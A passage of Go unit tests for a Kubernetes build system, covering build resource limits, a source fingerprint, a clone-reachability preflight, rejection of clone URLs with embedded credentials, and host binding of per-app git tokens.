	require.NoError(t, CancelBuilds(context.Background(), client, "project-test", "my-app"))

	secrets, err := client.CoreV1().Secrets(buildsNamespace).List(context.Background(), metav1.ListOptions{})
	require.NoError(t, err)
	require.Len(t, secrets.Items, 1, "the app's orphaned build secret is swept; another project's is kept")
	assert.Equal(t, "keep", secrets.Items[0].Name)
}

func gitAppWithBuild(mem, cpu string) *kipperv1.App {
	return &kipperv1.App{Spec: kipperv1.AppSpec{Git: &kipperv1.AppGitSource{
		URL:            "https://github.com/acme/web.git",
		BuildResources: &kipperv1.BuildResources{Memory: mem, CPU: cpu},
	}}}
}

func TestBuildLimits(t *testing.T) {
	// Default when nothing is set anywhere.
	t.Setenv("BUILD_MEMORY_LIMIT", "")
	t.Setenv("BUILD_CPU_LIMIT", "")
	cpu, mem := buildLimits(&kipperv1.App{Spec: kipperv1.AppSpec{Git: &kipperv1.AppGitSource{}}})
	if mem.String() != defaultBuildMemoryLimit || cpu.String() != defaultBuildCPULimit {
		t.Fatalf("defaults: cpu=%s mem=%s", cpu.String(), mem.String())
	}

	// Cluster default overrides the built-in default.
	t.Setenv("BUILD_MEMORY_LIMIT", "4Gi")
	t.Setenv("BUILD_CPU_LIMIT", "3")
	cpu, mem = buildLimits(&kipperv1.App{Spec: kipperv1.AppSpec{Git: &kipperv1.AppGitSource{}}})
	if mem.String() != "4Gi" || cpu.String() != "3" {
		t.Fatalf("cluster default: cpu=%s mem=%s", cpu.String(), mem.String())
	}

	// Per-app override beats the cluster default.
	cpu, mem = buildLimits(gitAppWithBuild("6Gi", "2"))
	if mem.String() != "6Gi" || cpu.String() != "2" {
		t.Fatalf("per-app: cpu=%s mem=%s", cpu.String(), mem.String())
	}

	// A malformed per-app value falls through to the cluster default, not an
	// error, so a typo can never wedge the build.
	cpu, mem = buildLimits(gitAppWithBuild("not-a-quantity", ""))
	if mem.String() != "4Gi" || cpu.String() != "3" {
		t.Fatalf("malformed per-app: cpu=%s mem=%s", cpu.String(), mem.String())
	}

	// A zero or negative per-app value parses but is not a usable limit
	// (Kubernetes would reject the Job), so it also falls through rather than
	// wedging the build.
	cpu, mem = buildLimits(gitAppWithBuild("0", "-1"))
	if mem.String() != "4Gi" || cpu.String() != "3" {
		t.Fatalf("non-positive per-app: cpu=%s mem=%s", cpu.String(), mem.String())
	}

	// A malformed cluster default with no per-app value falls to the built-in.
	t.Setenv("BUILD_MEMORY_LIMIT", "garbage")
	cpu, mem = buildLimits(&kipperv1.App{Spec: kipperv1.AppSpec{Git: &kipperv1.AppGitSource{}}})
	if mem.String() != defaultBuildMemoryLimit {
		t.Fatalf("malformed cluster default: mem=%s", mem.String())
	}
	_ = cpu
}

// The fingerprint decides whether a finished build may deploy, so anything that
// changes the artefact has to change it. Listing fields by hand is how the
// first version omitted BuildArgs, which Kaniko is given directly.
func TestGitSourceFingerprintCoversEveryArtefactDecidingField(t *testing.T) {
	base := &kipperv1.AppGitSource{
		URL: "https://git.example.com/shop/checkout.git", Branch: "main",
		DockerfilePath: "Dockerfile", Context: ".",
		BuildArgs: map[string]string{"VERSION": "old"},
	}

	for name, changed := range map[string]*kipperv1.AppGitSource{
		"repository": {URL: "https://git.example.com/shop/other.git", Branch: "main", DockerfilePath: "Dockerfile", Context: ".", BuildArgs: map[string]string{"VERSION": "old"}},
		"branch":     {URL: base.URL, Branch: "release", DockerfilePath: "Dockerfile", Context: ".", BuildArgs: map[string]string{"VERSION": "old"}},
		"dockerfile": {URL: base.URL, Branch: "main", DockerfilePath: "docker/Dockerfile", Context: ".", BuildArgs: map[string]string{"VERSION": "old"}},
		"context":    {URL: base.URL, Branch: "main", DockerfilePath: "Dockerfile", Context: "./service", BuildArgs: map[string]string{"VERSION": "old"}},
		"build arg":  {URL: base.URL, Branch: "main", DockerfilePath: "Dockerfile", Context: ".", BuildArgs: map[string]string{"VERSION": "new"}},
		"added arg":  {URL: base.URL, Branch: "main", DockerfilePath: "Dockerfile", Context: ".", BuildArgs: map[string]string{"VERSION": "old", "FLAVOUR": "lite"}},
	} {
		assert.NotEqual(t, GitSourceFingerprint(base), GitSourceFingerprint(changed),
			"changing the %s produces a different image but the same fingerprint", name)
	}
}

// Rotating a token or resizing the build changes neither the image nor which
// build is current, so an in-flight build must survive both.
func TestGitSourceFingerprintIgnoresWhatDoesNotDecideTheArtefact(t *testing.T) {
	base := &kipperv1.AppGitSource{URL: "https://git.example.com/shop/checkout.git", Branch: "main"}

	rotated := *base
	rotated.CredentialsSecret = "checkout-git-credentials" //nolint:gosec // G101 false positive: a K8s Secret name
	resized := *base
	resized.BuildResources = &kipperv1.BuildResources{Memory: "6Gi", CPU: "2"}

	assert.Equal(t, GitSourceFingerprint(base), GitSourceFingerprint(&rotated),
		"rotating a credential discarded a build in flight")
	assert.Equal(t, GitSourceFingerprint(base), GitSourceFingerprint(&resized),
		"resizing the build discarded a build in flight")
}

// Map iteration order must not leak into the fingerprint, or a build would be
// discarded at random.
func TestGitSourceFingerprintIsStableAcrossRuns(t *testing.T) {
	source := &kipperv1.AppGitSource{
		URL: "https://git.example.com/shop/checkout.git", Branch: "main",
		BuildArgs: map[string]string{"A": "1", "B": "2", "C": "3", "D": "4", "E": "5"},
	}

	first := GitSourceFingerprint(source)
	for range 20 {
		assert.Equal(t, first, GitSourceFingerprint(source))
	}
}

func TestGitSourceFingerprintOfNoSourceMatchesNothing(t *testing.T) {
	assert.NotEqual(t, GitSourceFingerprint(nil),
		GitSourceFingerprint(&kipperv1.AppGitSource{URL: "https://git.example.com/shop/checkout.git"}))
}

// Every existing test here is about what the Job looks like, not about whether
// a repository answers, so the preflight is stubbed for all of them. The tests
// that are about the preflight set it themselves.
func init() {
	ReachGit = func(context.Context, string, string, string, string) (gitreach.Result, string) {
		return gitreach.Reachable, ""
	}
}

// The gap the reviewers refused to accept as closed: an App CR written straight
// to the Kubernetes API — by `kip app deploy --git`, or by a GitOps engine —
// never passes through the console handler that checks. Every build passes
// through here, so this is the one place that answers for all of them, and it
// asks from where the clone will actually run rather than from a laptop.
func TestCreateBuildJobRefusesASourceItCannotClone(t *testing.T) {
	original := ReachGit
	ReachGit = func(context.Context, string, string, string, string) (gitreach.Result, string) {
		return gitreach.NeedsCredential, "this repository is private, so it needs an access token"
	}
	t.Cleanup(func() { ReachGit = original })

	client := buildFakeClient()
	app := testApp()

	_, err := CreateBuildJob(context.Background(), client, app, "9f2c1a")

	require.Error(t, err)
	assert.Contains(t, err.Error(), "access token")

	jobs, listErr := client.BatchV1().Jobs(buildsNamespace).List(context.Background(), metav1.ListOptions{})
	require.NoError(t, listErr)
	assert.Empty(t, jobs.Items, "no pod is launched to attempt a clone that cannot succeed")
}

// A host this cluster cannot reach has said nothing about the repository, and
// refusing the build on it would make a network blip look like a broken app.
func TestCreateBuildJobStillBuildsWhenTheCheckCannotComplete(t *testing.T) {
	original := ReachGit
	ReachGit = func(context.Context, string, string, string, string) (gitreach.Result, string) {
		return gitreach.Unknown, "the repository could not be reached from the cluster"
	}
	t.Cleanup(func() { ReachGit = original })

	_, err := CreateBuildJob(context.Background(), buildFakeClient(), testApp(), "9f2c1a")

	require.NoError(t, err)
}

// A token written into the URL is not a credential the builder can protect:
// git records the clone URL in /workspace/.git/config, /workspace is the build
// context, and an ordinary COPY bakes it into a layer. The handlers reject it,
// but an App CR written straight to the Kubernetes API by the CLI or a GitOps
// engine never passes through them — it passes through here.
func TestCreateBuildJobRefusesACredentialEmbeddedInTheURL(t *testing.T) {
	for _, embedded := range []string{
		"https://operator:ghp_secret@git.example.com/shop/checkout.git",
		"https://ghp_secret@git.example.com/shop/checkout.git",
	} {
		app := testApp()
		app.Spec.Git.URL = embedded
		app.Spec.Git.CredentialsSecret = ""

		_, err := CreateBuildJob(context.Background(), buildFakeClient(), app, "9f2c1a")

		require.Error(t, err, "%s was accepted", embedded)
		assert.Contains(t, err.Error(), "username or password")
	}
}

// A per-app credential was trusted purely because the tenant owns both the
// token and the URL. Two overlapping source changes whose CR updates both fail
// can leave the Secret holding one host's token beside another host's URL
// without anyone asking for it, so the pairing has to be checked rather than
// assumed — the same check the shared-credential path already makes.
func TestResolveGitTokenRefusesAPerAppCredentialBoundElsewhere(t *testing.T) {
	app := &kipperv1.App{
		ObjectMeta: metav1.ObjectMeta{Name: "checkout", Namespace: "shop-test"},
		Spec: kipperv1.AppSpec{Git: &kipperv1.AppGitSource{ //nolint:gosec // k8s Secret object name, not a credential value
			URL:               "https://git.example.com/shop/checkout.git",
			CredentialsSecret: "checkout-git-credentials",
		}},
	}
	secret := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name: "checkout-git-credentials", Namespace: "shop-test",
			Annotations: map[string]string{GitAuthorityAnnotation: "git.other.example.com"},
		},
		Data: map[string][]byte{"token": []byte("a-token-for-the-other-host")},
	}

	_, err := resolveGitToken(context.Background(), fake.NewClientset(secret), app, "git.example.com")

	require.Error(t, err, "a token bound to another host was offered to this one")
	assert.Contains(t, err.Error(), "git.other.example.com")
}

// A credential written before the binding was recorded carries no annotation,
// and refusing those would break every app already cloning happily.
func TestResolveGitTokenAcceptsAPerAppCredentialWithNoRecordedBinding(t *testing.T) {
	app := &kipperv1.App{
		ObjectMeta: metav1.ObjectMeta{Name: "checkout", Namespace: "shop-test"},
		Spec: kipperv1.AppSpec{Git: &kipperv1.AppGitSource{ //nolint:gosec // k8s Secret object name, not a credential value
			URL:               "https://git.example.com/shop/checkout.git",
			CredentialsSecret: "checkout-git-credentials",
		}},
	}
	secret := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{Name: "checkout-git-credentials", Namespace: "shop-test"},
		Data:       map[string][]byte{"token": []byte("a-token")},
	}

	token, err := resolveGitToken(context.Background(), fake.NewClientset(secret), app, "git.example.com")

	require.NoError(t, err)
	assert.Equal(t, []byte("a-token"), token)
}
